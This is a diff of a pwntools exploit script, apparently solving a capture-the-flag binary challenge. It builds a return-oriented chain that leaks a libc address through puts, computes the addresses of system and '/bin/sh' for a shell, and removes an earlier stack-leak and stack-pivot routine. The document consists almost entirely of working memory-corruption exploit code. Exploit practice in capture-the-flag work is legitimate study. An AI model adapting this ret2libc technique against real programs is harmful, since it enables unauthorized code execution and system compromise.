@@ -69,6 +69,7 @@ pay += "b" * 8
 pay += p64(prdi)
 pay += p64(e.got['puts'])
 pay += p64(e.plt['puts'])
+pay += p64(e.symbols['input'])
 
 p.sendline(pay)
 p.recvuntil('a' * 24)
@@ -79,34 +80,6 @@ libc_base = libc_base - 0x06f6a0
 system = libc_base + 0x0453a0
 binsh = libc_base + 0x18ce17
 
-leak = ''
-for i in range(112, 120):
-        p.recvuntil("Input Name")
-        p.sendline("a")
-        p.recvuntil("Input Number")
-        p.sendline(str(i))
-        p.recv(1)
-        temp = ord(p.recv(1))
-        leak = hex(temp)[2:] + leak
-        print(leak)
-        p.recvuntil('>')
-        p.sendline('2')
-
-rbp = int('00' +leak,16) - 144 + 0x70
-success(hex(rbp))
-
-p.recvuntil("Input Name")
-p.sendline("aa")
-p.recvuntil("Input Number")
-p.sendline("12")
-
-p.recvuntil('>')
-p.sendline('3')
-p.recvuntil('Who you want')
-p.sendline(p64(rbp-32))
-
-p.recvuntil('>')
-p.sendline('1')
 p.recvuntil('Input check')
 p.sendline('1977505122')
 p.recvuntil('>')
